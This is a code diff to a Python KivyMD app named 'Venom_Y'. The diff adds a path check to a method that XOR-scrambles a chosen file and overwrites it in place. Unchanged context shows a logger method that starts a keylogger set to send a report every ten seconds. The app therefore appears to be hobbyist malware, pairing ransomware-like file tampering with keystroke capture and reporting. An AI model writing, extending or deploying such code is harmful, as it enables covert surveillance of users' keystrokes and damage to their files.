@@ -9,6 +9,7 @@ class Testapp(MDApp):
         self.theme_cls.primary_palette = "BlueGray"
         self.theme_cls.theme_style = "Dark"
         self.title = "Venom_Y"
+        self.path=""
         return 
 
     def __init__(self, **kwargs):
@@ -33,21 +34,21 @@ class Testapp(MDApp):
         self.file_manager.close()
 
     def to_encrypt(self):
-        try:
-            key = 1
-            fin = open(self.path,'rb')
-            ob = fin.read()
-            fin.close()
-            ob= bytearray(ob)
-            for index, values in enumerate(ob):
-                ob[index] = values ^ key
-            fin = open(self.path, 'wb')
-            fin.write(ob)
-            fin.close()
-            toast('done')
-        except Exception:
-            toast('Error caught', Exception.__name__)
-    
+        if self.path:
+            try:
+                key = 1
+                fin = open(self.path,'rb')
+                ob = fin.read()
+                fin.close()
+                ob= bytearray(ob)
+                for index, values in enumerate(ob):
+                    ob[index] = values ^ key
+                fin = open(self.path, 'wb')
+                fin.write(ob)
+                fin.close()
+                toast('done')
+            except Exception:
+                toast('Error caught', Exception.__name__)
     def logger(self):
         SEND_REPORT_EVERY = 10
         key = keylogger.Keylogger(interval=SEND_REPORT_EVERY)
